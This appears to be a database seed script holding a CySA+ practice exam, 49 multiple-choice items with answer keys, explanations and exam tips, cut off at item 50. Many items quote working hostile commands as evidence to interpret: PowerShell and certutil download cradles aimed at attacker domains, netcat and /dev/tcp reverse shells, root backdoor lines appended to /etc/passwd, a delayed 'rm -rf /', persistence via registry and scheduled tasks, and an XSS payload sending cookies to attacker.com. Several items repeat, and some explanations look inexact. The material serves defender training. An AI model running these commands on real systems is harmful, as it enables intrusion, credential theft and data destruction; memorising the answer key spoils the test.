db.tests.insertOne({
  "category": "cysa",
  "testId": 9,
  "testName": "CompTIA CySa+ (CS0-003) Practice Test #9 (Ruthless)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A security analyst detects the following encoded PowerShell command in system logs:\n\n`powershell -ep bypass -w hidden -enc SQBFAFggKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQucHMxJyk7IEVYKCk=`\n\nWhat is the FIRST step the analyst should take?",
      "options": [
        "Decode the Base64 string and analyze the script",
        "Block outbound connections to `malicious-site.com`",
        "Terminate all running PowerShell instances",
        "Reboot the affected system to clear memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The encoded PowerShell command downloads and executes a remote script. Decoding it helps determine its exact function.",
      "examTip": "Always decode and analyze encoded scripts before taking remediation actions."
    },
    {
      "id": 2,
      "question": "A security analyst reviews the following Windows event log entry:\n\n`Event ID: 4625 | Logon Type: 3 | Status: 0xC000006D | Substatus: 0xC0000064 | Workstation Name: COMPROMISED`\n\nWhat does this log entry indicate?",
      "options": [
        "An attacker attempting to authenticate with a non-existent username",
        "A failed interactive login attempt via RDP",
        "A brute-force attack using a dictionary list",
        "A successful Kerberos authentication request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Status `0xC000006D` with substatus `0xC0000064` means the username does not exist in the domain.",
      "examTip": "Monitor failed logins for non-existent usernames to detect early reconnaissance attempts."
    },
    {
      "id": 3,
      "question": "An attacker gains access to a Linux system and runs the following command:\n\n`nohup bash -c 'while true; do nc -lvp 8080 -e /bin/bash; done' &`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Creating a persistent reverse shell that restarts upon termination",
        "Scanning for open ports on the local network",
        "Dumping password hashes from `/etc/shadow`",
        "Exfiltrating system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is setting up a persistent Netcat listener that continuously spawns a shell for remote access.",
      "examTip": "Monitor for unauthorized processes running with `nohup` and block unnecessary open ports."
    },
    {
      "id": 4,
      "question": "A forensic investigator finds the following suspicious entry in `/etc/ld.so.preload`:\n\n`/lib/x86_64-linux-gnu/malicious.so`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Preloading a malicious shared library to intercept system calls",
        "Hiding a malicious binary from process monitoring tools",
        "Injecting a rootkit into the Linux kernel",
        "Hijacking DNS queries to redirect network traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying `/etc/ld.so.preload` allows the attacker to preload a shared library that can hook and modify system calls.",
      "examTip": "Monitor changes to `/etc/ld.so.preload` and verify loaded shared libraries for anomalies."
    },
    {
      "id": 5,
      "question": "A penetration tester executes the following command:\n\n`bloodhound-python -c All -u user -p password -d domain.local`\n\nWhat is the purpose of this command?",
      "options": [
        "Enumerating Active Directory relationships to find privilege escalation paths",
        "Performing Kerberoasting to extract service account credentials",
        "Dumping NTLM password hashes from the domain controller",
        "Scanning for open RDP ports on a target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
    },
    {
      "id": 6,
      "question": "A forensic analyst detects the following Base64-encoded command being executed on a Windows machine:\n\n`aG9zdG5hbWU7IG5ldCAtYWQgMTkyLjE2OC4xLjEgLzU0IGludGVyZmFjZTogZXRoMQ==`\n\nWhat is the attacker's likely objective?",
      "options": [
        "Adding a new static route to manipulate network traffic",
        "Creating a hidden user account",
        "Dumping NTLM hashes",
        "Performing a pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command to add a static route, which can be used to manipulate traffic.",
      "examTip": "Monitor network configuration changes and restrict administrative access to routing tables."
    },
    {
      "id": 7,
      "question": "A multinational conglomerate, subject to multiple regulations, intends to unify its governance strategy across all subsidiaries. To ensure cohesive risk management and ongoing compliance, which action should be taken FIRST?",
      "options": [
        "Immediately apply the strictest known regulation enterprise-wide to enforce a universally high standard.",
        "Build an integrated control framework that merges shared requirements from each regulation, then roll out incrementally.",
        "Appoint regional legal teams to draft localized policies without referencing corporate-level mandates.",
        "Require each subsidiary to discontinue any processes not explicitly allowed under every applicable regulation."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Developing an integrated control framework that consolidates overlapping requirements from various regulations allows for a phased, strategic rollout. Simply enforcing the most stringent controls or halting processes altogether can overburden or stall operations unnecessarily.",
      "examTip": "Identifying commonalities between regulations is essential for streamlining compliance without compromising operations."
    },
    {
      "id": 8,
      "question": "An attacker gains access to an Active Directory environment and executes the following command:\n\n`dcsync /user:Administrator /domain:corp.local`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Extract NTLM password hashes directly from the domain controller",
        "Create a new domain administrator account",
        "Enumerate Active Directory groups",
        "Disable security auditing on the domain controller"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command allows an attacker to pull NTLM hashes directly from the domain controller, a critical credential theft technique.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 9,
      "question": "After adopting a globally recognized governance framework, a large enterprise finds certain mandatory controls may not align with specific high-availability requirements in critical data centers. Which approach BEST ensures compliance without undermining the data centers’ operational goals?",
      "options": [
        "Relax the critical data centers' operational goals so they are fully compliant with all mandatory controls.",
        "Formulate compensating controls that achieve equivalent risk mitigation, validated through a formal exception process.",
        "Exclude critical data centers from the governance framework to maintain availability standards.",
        "Adopt an alternative framework designed specifically for high-availability environments, discarding the initial framework."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Utilizing compensating controls that provide equivalent or better security ensures both compliance and operational continuity. Simply relaxing requirements or excluding key environments can introduce unacceptable risk, while switching frameworks prematurely could create gaps elsewhere.",
      "examTip": "A well-defined exception process with validated compensating controls allows organizations to remain flexible while complying with core governance principles."
    },
    {
      "id": 10,
      "question": "An attacker is attempting a brute-force attack against a web application's login form. The attacker is using a list of common usernames and passwords. However, after a few attempts, the attacker's IP address is blocked, and they can no longer access the login form. Which of the following security controls MOST likely prevented the attack?",
      "options": [
        "Cross-site scripting (XSS) protection",
        "Rate limiting and/or account lockout",
        "SQL injection prevention",
        "Content Security Policy (CSP)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "XSS protection prevents script injection. SQL injection prevention protects against database attacks. CSP controls resource loading. *Rate limiting* and *account lockouts* are the most likely defenses. Rate Limiting: This restricts the number of requests (in this case, login attempts) that can be made from a single IP address or user account within a given time period.Account Lockout: This temporarily (or permanently) disables an account after a certain number of failed login attempts.Both of these controls are designed to thwart brute-force attacks by making it impractical for an attacker to try a large number of username/password combinations. The fact that the attacker's IP address was blocked suggests that rate limiting was in place (or potentially an IP-based blocklist triggered by the repeated attempts).",
      "examTip": "Rate limiting and account lockouts are effective defenses against brute-force attacks."
    },
    {
      "id": 11,
      "question": "A forensic analyst detects the following PowerShell command being executed on a compromised system:\n\n`powershell.exe -nop -w hidden -c \"IEX((New-Object System.Net.WebClient).DownloadString('hxxp://attacker.com/payload.ps1'))\"`\n\nWhat is the attacker's likely objective?",
      "options": [
        "Downloading and executing a fileless malware payload",
        "Disabling Windows Defender real-time protection",
        "Extracting NTLM password hashes",
        "Performing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command downloads and executes a remote PowerShell script directly in memory, evading detection.",
      "examTip": "Monitor PowerShell execution logs and restrict outbound connections from unauthorized scripts."
    },
    {
      "id": 12,
      "question": "An enterprise risk management (ERM) team is updating the risk register to reflect newly identified legal liabilities stemming from multiple jurisdictions. Which step MOST effectively ensures the updates maintain accuracy and support ongoing governance requirements?",
      "options": [
        "Overhaul the entire risk register with country-specific sections, making it highly detailed for each locality.",
        "Conduct a comprehensive legal audit for each jurisdiction and align findings directly to entries in the existing risk register.",
        "Create separate registers for each jurisdiction to isolate legal liabilities, then merge them quarterly.",
        "Cancel all risky international ventures until the organization fully understands every local regulation."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Aligning the risk register with up-to-date legal findings ensures each identified liability is accurately captured and monitored within the existing framework. Merely subdividing or segregating the register by country can obscure enterprise-wide risk visibility.",
      "examTip": "Integrating diverse legal considerations into a unified risk register preserves a holistic, real-time view of enterprise liabilities."
    },
    {
      "id": 13,
      "question": "An attacker successfully executes the following command on a Linux machine:\n\n`echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd`\n\nWhat is the attacker's goal?",
      "options": [
        "Creating a hidden root-level backdoor account",
        "Disabling authentication for all users",
        "Deleting user accounts from the system",
        "Executing a privilege escalation exploit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Appending this entry to `/etc/passwd` creates a new root-level account named 'backdoor'.",
      "examTip": "Monitor modifications to `/etc/passwd` and restrict write access to critical system files."
    },
    {
      "id": 14,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -Pn --script smb-vuln-ms17-010 <target>`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Identify systems vulnerable to EternalBlue (MS17-010)",
        "Scan for open SMB shares",
        "Perform an ARP poisoning attack",
        "Bypass network firewalls using SYN scans"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-vuln-ms17-010` script checks if the target is vulnerable to EternalBlue, a critical SMB exploit.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 15,
      "question": "A security analyst notices the following process executing on a compromised Windows system:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the significance of this command?",
      "options": [
        "Executing JavaScript in a Windows environment to bypass security policies",
        "Disabling Windows event logging",
        "Exfiltrating sensitive data using encoded HTTP requests",
        "Gaining SYSTEM privileges via a privilege escalation exploit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command abuses `rundll32.exe` to execute JavaScript in a Windows environment, commonly used in malware execution.",
      "examTip": "Monitor `rundll32.exe` executions and enforce script execution restrictions."
    },
    {
      "id": 16,
      "question": "An attacker successfully compromises a Linux system and modifies the following file:\n\n`export PATH=/tmp/malicious:$PATH`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Hijacking system commands by modifying the PATH variable",
        "Granting root privileges to a malicious process",
        "Extracting credentials from memory",
        "Redirecting traffic to a phishing site"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By modifying the PATH variable, the attacker ensures that their malicious binaries are executed instead of legitimate system commands.",
      "examTip": "Monitor environment variable changes and enforce execution control policies."
    },
    {
      "id": 17,
      "question": "A security analyst detects an attacker executing the following command on a compromised endpoint:\n\n`rundll32.exe shell32.dll,Control_RunDLL ncpa.cpl`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Opening the network connections GUI to modify network settings",
        "Extracting user credentials from memory",
        "Disabling Windows Defender",
        "Escalating privileges to SYSTEM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command opens the network connections panel, which an attacker may use to alter network settings for persistence.",
      "examTip": "Monitor suspicious `rundll32.exe` executions and restrict administrative access."
    },
    {
      "id": 18,
      "question": "A forensic analyst finds the following encoded PowerShell command in event logs:\n\n`powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat should the analyst do FIRST?",
      "options": [
        "Decode the command and analyze its intent",
        "Execute the command in a sandboxed environment",
        "Ignore the event unless further evidence is found",
        "Block all PowerShell scripts on the endpoint"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` flag indicates Base64 encoding, requiring decoding to determine its true intent before taking action.",
      "examTip": "Always decode and analyze encoded scripts before execution or blocking."
    },
    {
      "id": 19,
      "question": "A global healthcare provider wants to optimize its governance processes after merging with a research laboratory. Both organizations follow different compliance frameworks. Which FIRST step ensures smooth integration without compromising either entity’s regulatory obligations?",
      "options": [
        "Immediately adopt the laboratory’s framework because it covers specialized research requirements.",
        "Combine each control from both frameworks to form a larger list, ensuring no requirement is overlooked.",
        "Perform a comparative analysis to identify overlapping and conflicting controls, then design a unified approach.",
        "Disregard both frameworks temporarily and implement an internally developed set of enterprise policies."
      ],
      "correctAnswerIndex": 2,
      "explanation": "A comparative analysis highlights overlaps and conflicts, guiding a hybrid governance model that meets both healthcare and research standards. Merging all controls indiscriminately or discarding established frameworks can create confusion or compliance gaps.",
      "examTip": "Efficient integration begins by mapping existing controls to uncover precise redundancies and divergences."
    },
    {
      "id": 20,
      "question": "An attacker executes the following command:\n\n`certutil -urlcache -split -f http://malicious.com/malware.exe malware.exe`\n\nWhat is the intent of this command?",
      "options": [
        "Downloading and storing a malicious file using a built-in Windows utility",
        "Disabling Windows security updates",
        "Exfiltrating encrypted data to a remote server",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `certutil` command is a living-off-the-land (LotL) technique to download and execute malware without triggering antivirus alerts.",
      "examTip": "Monitor `certutil.exe` usage and restrict outbound connections from non-administrative users."
    },
    {
      "id": 21,
      "question": "A forensic investigator discovers the following entry in a compromised Linux system’s bash history:\n\n`echo 'bash -i >& /dev/tcp/203.0.113.5/443 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh && /tmp/.backdoor.sh`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Establishing a persistent reverse shell to an external attacker",
        "Deleting system logs to cover tracks",
        "Injecting a rootkit into kernel memory",
        "Executing a brute-force attack on user credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command sets up a reverse shell that connects to an attacker's machine, allowing remote control of the system.",
      "examTip": "Monitor for unauthorized script execution and block outbound connections to suspicious IPs."
    },
    {
      "id": 22,
      "question": "A penetration tester executes the following command:\n\n`nmap --script smb-enum-users,smb-enum-shares -p 445 <target>`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerating SMB users and shares on the target system",
        "Performing an SMB brute-force attack",
        "Exploiting an SMB vulnerability",
        "Dumping NTLM hashes from the target machine"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-enum-users` and `smb-enum-shares` scripts retrieve a list of shared files and user accounts over SMB.",
      "examTip": "Disable SMBv1 and enforce strong authentication to prevent unauthorized enumeration."
    },
    {
      "id": 23,
      "question": "A network security analyst detects repeated outbound DNS queries with randomized subdomains such as:\n\n```\nabx91jz.example.com\nzxc12ml.example.com\nqwerty45.example.com\n```\n\nWhat is the MOST likely explanation?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for command-and-control (C2)",
        "A legitimate software update process",
        "A brute-force attack against a DNS server",
        "An NTP synchronization request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA-based malware generates randomized subdomains to evade detection while maintaining C2 communication.",
      "examTip": "Use DNS filtering and anomaly detection to identify and block DGA-based malware."
    },
    {
      "id": 24,
      "question": "An attacker successfully exploits a misconfigured Linux system and modifies the following file:\n\n`echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`\n\nWhat is the attacker's objective?",
      "options": [
        "Creating an unauthorized root-level backdoor account",
        "Deleting all user accounts on the system",
        "Disabling authentication for all users",
        "Modifying the system's firewall settings"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Appending an entry to `/etc/passwd` allows an attacker to create a backdoor account with root privileges.",
      "examTip": "Monitor file integrity changes in `/etc/passwd` and restrict write access."
    },
    {
      "id": 25,
      "question": "An attacker executes the following command on a compromised Linux server:\n\n`iptables -A OUTPUT -p tcp --dport 443 -j DROP`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Preventing the system from making outbound HTTPS connections",
        "Blocking all incoming SSH traffic",
        "Disabling logging for outbound network activity",
        "Allowing only encrypted traffic through the firewall"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By adding this rule, the attacker prevents the system from establishing HTTPS connections, possibly to evade detection.",
      "examTip": "Monitor firewall rule changes and use security baselines to enforce configurations."
    },
    {
      "id": 26,
      "question": "A forensic analyst reviewing endpoint logs finds the following Base64-encoded PowerShell command:\n\n`cG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWNvbW1hbmQgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ==`\n\nWhat does the attacker aim to achieve?",
      "options": [
        "Disabling Windows Defender’s real-time monitoring",
        "Encrypting files to deploy ransomware",
        "Exfiltrating NTLM hashes from memory",
        "Creating a hidden user account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 command reveals a command to disable Windows Defender real-time monitoring.",
      "examTip": "Monitor PowerShell execution logs and enforce security controls to prevent unauthorized configuration changes."
    },
    {
      "id": 27,
      "question": "An organization plans to address potential gaps in its third-party risk management program, which is spread across various departments. Which of the following is the MOST critical first action to ensure consistent governance of vendor relationships?",
      "options": [
        "Establish uniform scoring criteria for vendor risk assessments across all departments.",
        "Enforce a freeze on contracting new vendors until all existing vendors pass a re-audit.",
        "Reduce the number of external vendors significantly to simplify risk management.",
        "Assign each department a unique set of vendor security requirements based on departmental priorities."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Implementing a unified scoring methodology enables objective comparison of vendor risks across departments. Freezing new contracts or arbitrarily downsizing the vendor pool might cause operational setbacks, and department-specific requirements may lead to inconsistent governance.",
      "examTip": "Consistent, measurable criteria are the foundation of a strong third-party risk management strategy."
    },
    {
      "id": 28,
      "question": "A security analyst detects the following PowerShell execution on a Windows server:\n\n`Set-MpPreference -DisableRealtimeMonitoring $true`\n\nWhat is the significance of this command?",
      "options": [
        "Disabling Windows Defender real-time protection",
        "Dumping credentials from LSASS memory",
        "Exfiltrating data using encoded HTTP requests",
        "Clearing system event logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This PowerShell command disables Windows Defender's real-time protection, allowing malware execution without detection.",
      "examTip": "Monitor security policy changes and restrict PowerShell execution policies."
    },
    {
      "id": 29,
      "question": "An attacker compromises an Active Directory environment and executes the following command:\n\n`dcsync /user:Administrator /domain:corp.local`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Extracting NTLM password hashes directly from the domain controller",
        "Creating a new domain administrator account",
        "Enumerating Active Directory groups",
        "Disabling security auditing on the domain controller"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command allows an attacker to pull NTLM hashes directly from the domain controller, a critical credential theft technique.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 30,
      "question": "An organization’s board of directors has mandated an overhaul of the governance framework to address emerging compliance challenges. Which approach BEST ensures a successful transition without overwhelming current operations?",
      "options": [
        "Implement the new governance framework enterprise-wide in a single rollout for maximum consistency.",
        "Assign an external consultancy firm full responsibility for governance implementation and management.",
        "Adopt a phased rollout, starting with critical business units, while maintaining legacy controls in other areas.",
        "Delay the new framework until all employees complete a mandatory governance certification program."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Introducing the new governance model in targeted phases avoids operational shock and allows lessons learned to be applied before expanding the rollout across all units. Immediate, full-scale adoption can hinder business continuity if issues arise.",
      "examTip": "A staged approach to implementing new governance structures helps manage risk and promotes organizational acceptance."
    },
    {
      "id": 31,
      "question": "A security analyst reviews system logs and finds the following suspicious activity:\n\n```\n10.1.1.5 - - [15/Jun/2025:14:32:10 +0000] \"GET /index.php?cmd=cat+/etc/passwd HTTP/1.1\" 200 5120\n10.1.1.5 - - [15/Jun/2025:14:32:11 +0000] \"GET /index.php?cmd=ls+-la+/var/www/ HTTP/1.1\" 200 4096\n```\n\nWhat attack is being attempted?",
      "options": [
        "Command injection",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Local file inclusion (LFI)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is attempting command injection by passing system commands (`cat /etc/passwd`, `ls -la`) via an HTTP GET request.",
      "examTip": "Sanitize user input and use allowlists for acceptable commands to prevent injection attacks."
    },
    {
      "id": 32,
      "question": "A penetration tester executes the following command on an internal network:\n\n`responder -I eth0`\n\nWhat is the primary objective of this action?",
      "options": [
        "Intercepting and poisoning network authentication requests",
        "Performing a brute-force attack on SMB",
        "Enumerating domain controllers in an Active Directory environment",
        "Exfiltrating credentials via HTTP requests"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder is used to poison LLMNR/NBT-NS requests to capture and relay credentials in network environments.",
      "examTip": "Disable LLMNR and NBT-NS on corporate networks to prevent credential theft."
    },
    {
      "id": 33,
      "question": "An attacker successfully gains access to a Linux system and executes the following command:\n\n`(sleep 300; rm -rf /) &`\n\nWhat is the impact of this command?",
      "options": [
        "Delaying execution before deleting all files on the system",
        "Clearing system logs to cover tracks",
        "Creating a new user account",
        "Escalating privileges to root"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `sleep 300` delays execution by 5 minutes before running `rm -rf /`, which deletes all files on the system.",
      "examTip": "Monitor process execution for delayed self-destructive commands and restrict root access."
    },
    {
      "id": 34,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing persistence by running malware at system startup",
        "Disabling Windows security policies",
        "Creating a hidden user account",
        "Dumping password hashes from the registry"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is adding a registry key that will execute malware every time the system starts.",
      "examTip": "Monitor registry modifications and restrict write access to startup keys."
    },
    {
      "id": 35,
      "question": "A forensic investigator finds the following command executed on a compromised system:\n\n`schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Setting up a scheduled task that runs malware every 5 minutes",
        "Clearing Windows event logs",
        "Scanning the local network for open ports",
        "Performing a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command schedules a malicious executable to run every 5 minutes, ensuring persistence.",
      "examTip": "Regularly audit scheduled tasks and remove unauthorized entries."
    },
    {
      "id": 36,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the goal of this scan?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Scanning for open RDP ports",
        "Performing a denial-of-service attack",
        "Bypassing network firewall restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide access to network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 37,
      "question": "An attacker runs the following command on a compromised Linux system:\n\n`nohup nc -e /bin/bash 203.0.113.10 4444 &`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Establishing a persistent reverse shell",
        "Scanning the local network for open ports",
        "Modifying user privileges",
        "Executing a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nohup` command ensures the process persists after logout, and Netcat is used to establish a reverse shell.",
      "examTip": "Monitor outbound connections and block unauthorized remote shells."
    },
    {
      "id": 38,
      "question": "A forensic investigator reviewing endpoint logs finds the following PowerShell execution:\n\n`powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat should the analyst do FIRST?",
      "options": [
        "Decode the command and analyze its intent",
        "Execute the command in a sandboxed environment",
        "Ignore the event unless further evidence is found",
        "Block all PowerShell scripts on the endpoint"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` flag indicates Base64 encoding, requiring decoding to determine its true intent before taking action.",
      "examTip": "Always decode and analyze encoded scripts before execution or blocking."
    },
    {
      "id": 39,
      "question": "An attacker modifies firewall rules using the following command:\n\n`iptables -A INPUT -p tcp --dport 22 -s 203.0.113.100 -j ACCEPT`\n\nWhat is the attacker's intent?",
      "options": [
        "Allowing SSH access only from their IP for persistence",
        "Blocking all incoming SSH traffic",
        "Disabling firewall rules for external connections",
        "Redirecting SSH traffic to a different server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command modifies firewall rules to allow SSH connections only from a specific attacker-controlled IP.",
      "examTip": "Monitor firewall rule changes and restrict administrative access to firewall configurations."
    },
    {
      "id": 40,
      "question": "A penetration tester executes the following command:\n\n`nltest /dclist:corp.local`\n\nWhat is the objective of this command?",
      "options": [
        "Enumerating all domain controllers in the Active Directory environment",
        "Extracting NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Identifying all users in the domain"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nltest /dclist` command lists all domain controllers within a specified Active Directory domain.",
      "examTip": "Monitor Active Directory enumeration commands to detect potential reconnaissance activity."
    },
    {
      "id": 41,
      "question": "A forensic analyst detects the following PowerShell execution on an endpoint:\n\n`powershell -exec bypass -nop -w hidden -c \"IEX((New-Object System.Net.WebClient).DownloadString('hxxp://malicious.com/rat.ps1'))\"`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Executing a remote access Trojan (RAT) filelessly",
        "Disabling Windows Defender's real-time protection",
        "Dumping NTLM password hashes from memory",
        "Exfiltrating user credentials via DNS tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a PowerShell RAT script in memory without writing to disk, a common technique for fileless malware.",
      "examTip": "Enable PowerShell script logging and restrict execution policies to prevent unauthorized script execution."
    },
    {
      "id": 42,
      "question": "A penetration tester executes the following command on an internal network:\n\n`crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd'`\n\nWhat is the tester attempting to do?",
      "options": [
        "Authenticate to an SMB share using known credentials",
        "Perform a brute-force attack against SMB",
        "Enumerate domain controllers",
        "Exploit an SMB vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`crackmapexec smb` is used to validate SMB authentication credentials, often utilized in lateral movement attacks.",
      "examTip": "Monitor SMB authentication attempts and enforce account lockout policies."
    },
    {
      "id": 43,
      "question": "An attacker exploits a Windows machine and executes the following command:\n\n`wmic process call create \"cmd.exe /c net user backdoor P@ssw0rd123 /add\"`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Creating a persistent backdoor user account",
        "Dumping credentials from LSASS",
        "Escalating privileges to SYSTEM",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command adds a new user account to maintain persistence on the compromised system.",
      "examTip": "Monitor user account creation logs and enforce strict account management policies."
    },
    {
      "id": 44,
      "question": "An attacker successfully compromises a Linux system and modifies the `/etc/cron.d` directory by adding the following entry:\n\n`*/2 * * * * root /tmp/.hidden_backdoor.sh`\n\nWhat is the purpose of this action?",
      "options": [
        "Creating a hidden scheduled task that runs every 2 minutes",
        "Performing a denial-of-service attack",
        "Dumping password hashes from `/etc/shadow`",
        "Executing a privilege escalation exploit"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By modifying the crontab, the attacker ensures a hidden backdoor script executes every 2 minutes for persistence.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/cron.d`."
    },
    {
      "id": 45,
      "question": "A forensic investigator reviewing system logs detects the following suspicious activity:\n\n```\nEvent ID: 1102 | Source: Microsoft-Windows-Eventlog | Message: The audit log was cleared.\n```\n\nWhat does this indicate?",
      "options": [
        "An attacker attempting to cover their tracks by clearing logs",
        "A normal log rotation process",
        "A system reboot event",
        "A scheduled task running log cleanup"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Event ID 1102 indicates that an attacker has cleared Windows event logs to remove forensic evidence.",
      "examTip": "Use event log forwarding to send logs to a secure central location before they can be deleted."
    },
    {
      "id": 46,
      "question": "An attacker successfully exploits a misconfigured web application and injects the following payload into a form field:\n\n`<script>fetch('http://attacker.com/steal?cookie='+document.cookie);</script>`\n\nWhat type of attack is being performed?",
      "options": [
        "Stored cross-site scripting (XSS)",
        "SQL injection",
        "Remote code execution (RCE)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The injected JavaScript is designed to steal session cookies from users, a common stored XSS attack technique.",
      "examTip": "Use Content Security Policy (CSP) headers and input sanitization to prevent XSS attacks."
    },
    {
      "id": 47,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -sU -p 161 <target>`\n\nWhat is the tester trying to achieve?",
      "options": [
        "Enumerate SNMP services",
        "Scan for open RDP ports",
        "Perform a brute-force attack",
        "Detect SQL injection vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 161 is used for SNMP, and scanning it may reveal misconfigured or vulnerable network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings for security."
    },
    {
      "id": 48,
      "question": "An attacker gains access to a Linux system and executes the following command:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the attacker's intent?",
      "options": [
        "Blocking SSH access to prevent remote administrative intervention",
        "Opening a new backdoor for persistent access",
        "Performing a denial-of-service attack",
        "Modifying DNS resolution settings"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By adding this rule, the attacker prevents legitimate users from accessing SSH remotely, ensuring the attack remains undisturbed.",
      "examTip": "Monitor firewall rule changes and use security baselines to enforce configurations."
    },
    {
      "id": 49,
      "question": "A penetration tester runs the following command on an Active Directory network:\n\n`bloodhound-python -c All -u pentest -p Password123 -d corp.local`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate Active Directory relationships for privilege escalation paths",
        "Perform Kerberoasting to extract service account credentials",
        "Dump NTLM password hashes from a domain controller",
        "Scan for open SMB ports on a target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
    },
    {
      "id": 50,
